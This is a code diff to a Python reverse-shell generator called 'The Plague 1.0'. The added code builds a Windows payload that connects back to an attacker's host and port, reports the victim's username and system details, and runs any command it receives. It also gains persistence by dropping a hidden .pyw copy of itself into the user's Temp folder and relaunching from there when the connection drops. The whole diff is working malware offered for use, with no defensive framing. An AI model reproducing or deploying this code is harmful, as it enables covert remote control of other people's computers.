@@ -17,6 +17,69 @@ banner = """
         The Plague 1.0
         Coded by Omar Ahmed
         Date of relese: March 4th 2023 """
+def get_sys_file(lhost, lport):
+    num3 = f"""from getpass import getuser
+from socket import * 
+import subprocess
+import platform
+import os 
+import time
+x = False
+get_os = platform.uname()
+get_user = getuser()
+os_info = "client_name : "+str(get_user)+" <-> "+"client_os : "+str(get_os)
+
+ip = "{lhost}"
+port = {lport}
+connection = socket(AF_INET, SOCK_STREAM)
+def spread():
+    if x :
+        os.system("python3 C:/Users/"+ "Lenovo" + "\AppData\Local\Temp/System-File-01.pyw")
+        exit()
+
+def is_still_connected(sock):
+    try:
+        sock.sendall(b"ping")
+        global x 
+        x = True
+    except:
+        spread()
+def final_func():
+    def conn_func():
+        connection.connect((ip, port))
+        connection.send(os_info.encode())
+        while True:
+            is_still_connected(connection)
+            recever = connection.recv(2000).decode()
+            if recever == "exit":
+                spread()
+            elif recever[:2] == "cd":
+                try:
+                    os.chdir(recever[3:])
+                except:
+                    spread()
+                connection.send(os.getcwd().encode())   
+            elif recever == "":
+                os.chdir(recever[3:])
+                connection.send(os.getcwd().encode())
+
+            else:
+                out_put = subprocess.getoutput(recever)
+
+                if out_put == "" or out_put == None:
+                    out_put = ""
+                    connection.send(out_put.encode())
+                else:
+                    connection.send(out_put.encode())
+    try:
+        conn_func()
+    except:
+        spread()
+while True:
+    time.sleep(2)
+    final_func()
+"""
+    return num3
 def clear_scr():
     if platform.platform()[0:3] == "Lin":
         os.system("clear")
@@ -104,6 +167,7 @@ try:
                                 else:
                                     client.send(cmd.encode())
                         except KeyboardInterrupt:
+                            client.send("exit".encode())
                             print("")
                             print("Are you to lazy to type exit!?")
                             exit()
@@ -116,29 +180,48 @@ import subprocess
 import platform
 import os 
 import time
-
+x = False
 get_os = platform.uname()
 get_user = getuser()
 os_info = "client_name : "+str(get_user)+" <-> "+"client_os : "+str(get_os)
 
 ip = "{LHOST}"
-
 port = {LPORT}
 connection = socket(AF_INET, SOCK_STREAM)
+def spread():
+    global x
+    if x :
+        global user
+        user = os.getlogin()
+        f = open("C:/Users/" + user + "\AppData\Local\Temp/System-File-01.pyw", "w")
+        f.write("""{get_sys_file(LHOST, LPORT)}""")
+        x = False
+    try:
+        os.system(r"python3 C:/Users/" + "Lenovo" + r"\AppData\Local\Temp/System-File-01.pyw")
+    except:
+        print(3)
+        pass
+def is_still_connected(sock):
+    try:
+        sock.sendall(b"ping")
+        global x 
+        x = True
+    except:
+        spread()
 def final_func():
     def conn_func():
         connection.connect((ip, port))
         connection.send(os_info.encode())
         while True:
+            is_still_connected(connection)
             recever = connection.recv(2000).decode()
-
             if recever == "exit":
-                exit()
+                spread()
             elif recever[:2] == "cd":
                 try:
                     os.chdir(recever[3:])
                 except:
-                    pass
+                    spread()
                 connection.send(os.getcwd().encode())   
             elif recever == "":
                 os.chdir(recever[3:])
@@ -155,10 +238,11 @@ def final_func():
     try:
         conn_func()
     except:
-        pass
+        spread()
 while True:
     time.sleep(2)
     final_func()
+
 ''')
                 f.close()
                 listener = input("do you want to start a listener y/n: ")
